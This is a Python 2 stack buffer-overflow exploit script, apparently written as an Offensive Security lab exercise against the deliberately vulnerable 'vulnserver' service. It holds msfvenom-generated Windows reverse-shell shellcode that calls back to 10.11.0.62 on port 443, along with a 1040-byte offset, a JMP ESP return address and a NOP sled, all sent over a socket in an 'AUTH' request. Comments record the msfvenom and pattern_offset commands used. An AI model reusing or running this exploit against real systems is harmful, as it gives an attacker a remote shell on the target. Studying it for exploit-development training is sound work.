#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

# Exercise for offsec vulnserver done by JMcPeters on 2/26/19
# msfvenom -p windows/shell_reverse_tcp -b '\x00' EXITFUNC=thread LHOST=10.11.0.62 LPORT=443 -f python

buf =  ""
buf += "\xda\xcc\xd9\x74\x24\xf4\xb8\x3a\xab\x14\x8f\x5f\x33"
buf += "\xc9\xb1\x52\x83\xc7\x04\x31\x47\x13\x03\x7d\xb8\xf6"
buf += "\x7a\x7d\x56\x74\x84\x7d\xa7\x19\x0c\x98\x96\x19\x6a"
buf += "\xe9\x89\xa9\xf8\xbf\x25\x41\xac\x2b\xbd\x27\x79\x5c"
buf += "\x76\x8d\x5f\x53\x87\xbe\x9c\xf2\x0b\xbd\xf0\xd4\x32"
buf += "\x0e\x05\x15\x72\x73\xe4\x47\x2b\xff\x5b\x77\x58\xb5"
buf += "\x67\xfc\x12\x5b\xe0\xe1\xe3\x5a\xc1\xb4\x78\x05\xc1"
buf += "\x37\xac\x3d\x48\x2f\xb1\x78\x02\xc4\x01\xf6\x95\x0c"
buf += "\x58\xf7\x3a\x71\x54\x0a\x42\xb6\x53\xf5\x31\xce\xa7"
buf += "\x88\x41\x15\xd5\x56\xc7\x8d\x7d\x1c\x7f\x69\x7f\xf1"
buf += "\xe6\xfa\x73\xbe\x6d\xa4\x97\x41\xa1\xdf\xac\xca\x44"
buf += "\x0f\x25\x88\x62\x8b\x6d\x4a\x0a\x8a\xcb\x3d\x33\xcc"
buf += "\xb3\xe2\x91\x87\x5e\xf6\xab\xca\x36\x3b\x86\xf4\xc6"
buf += "\x53\x91\x87\xf4\xfc\x09\x0f\xb5\x75\x94\xc8\xba\xaf"
buf += "\x60\x46\x45\x50\x91\x4f\x82\x04\xc1\xe7\x23\x25\x8a"
buf += "\xf7\xcc\xf0\x1d\xa7\x62\xab\xdd\x17\xc3\x1b\xb6\x7d"
buf += "\xcc\x44\xa6\x7e\x06\xed\x4d\x85\xc1\x18\x99\x85\x2f"
buf += "\x75\x9f\x85\x4e\x3e\x16\x63\x3a\x50\x7f\x3c\xd3\xc9"
buf += "\xda\xb6\x42\x15\xf1\xb3\x45\x9d\xf6\x44\x0b\x56\x72"
buf += "\x56\xfc\x96\xc9\x04\xab\xa9\xe7\x20\x37\x3b\x6c\xb0"
buf += "\x3e\x20\x3b\xe7\x17\x96\x32\x6d\x8a\x81\xec\x93\x57"
buf += "\x57\xd6\x17\x8c\xa4\xd9\x96\x41\x90\xfd\x88\x9f\x19"
buf += "\xba\xfc\x4f\x4c\x14\xaa\x29\x26\xd6\x04\xe0\x95\xb0"
buf += "\xc0\x75\xd6\x02\x96\x79\x33\xf5\x76\xcb\xea\x40\x89"
buf += "\xe4\x7a\x45\xf2\x18\x1b\xaa\x29\x99\x3b\x49\xfb\xd4"
buf += "\xd3\xd4\x6e\x55\xbe\xe6\x45\x9a\xc7\x64\x6f\x63\x3c"
buf += "\x74\x1a\x66\x78\x32\xf7\x1a\x11\xd7\xf7\x89\x12\xf2"


# Original Fuzz at 1072

# windows /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 37694236
# [*] Exact match at offset 1040
# req1 = "AUTH " + "A" * 1040 + "B" * 4 + "C" * 90

# jmp esp 7769B391

req1 = "AUTH " + "A" * 1040 + "\x91\xb3\x69\x77" + ("\x90" * 16) + buf + "\x90" * 20

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
